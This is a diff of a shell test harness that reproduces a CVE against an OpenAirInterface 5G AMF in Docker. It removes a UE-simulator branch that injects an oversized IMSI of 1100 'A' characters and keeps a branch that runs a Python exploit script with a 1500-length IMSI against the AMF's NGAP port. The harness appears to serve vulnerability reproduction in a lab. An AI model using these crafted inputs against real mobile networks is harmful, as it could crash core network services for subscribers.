@@ -177,10 +177,7 @@ run_cve() {
   docker logs oai-amf --tail 20 > "${AMF_LOG}.before" 2>&1 || true
   local TS; TS=$(elapsed)
 
-  if [[ "$CVE_METHOD" == "ueransim" ]]; then
-    local OVERSIZED_IMSI="001010000000102$(python3 -c 'print("A"*1100)')"
-    docker exec oai-nr-ue2 timeout 25 /opt/oai-nr-ue/bin/nr-uesoftmodem -O /opt/oai-nr-ue/etc/nr-ue.yaml -E --rfsim -r 106 --numerology 1 --uicc0.imsi "${OVERSIZED_IMSI}" -C 3319680000 --rfsimulator.serveraddr 192.168.70.160 --log_config.global_log_options level,nocolor,time >/dev/null 2>&1 || true
-  elif [[ "$CVE_METHOD" == "python" ]]; then
+  if [[ "$CVE_METHOD" == "python" ]]; then
     docker exec oai-attacker python3 /tmp/cve_65805_exploit.py --target "$AMF_IP" --port "$AMF_NGAP_PORT" --imsi-len 1500 >/dev/null 2>&1 || true
   fi
 
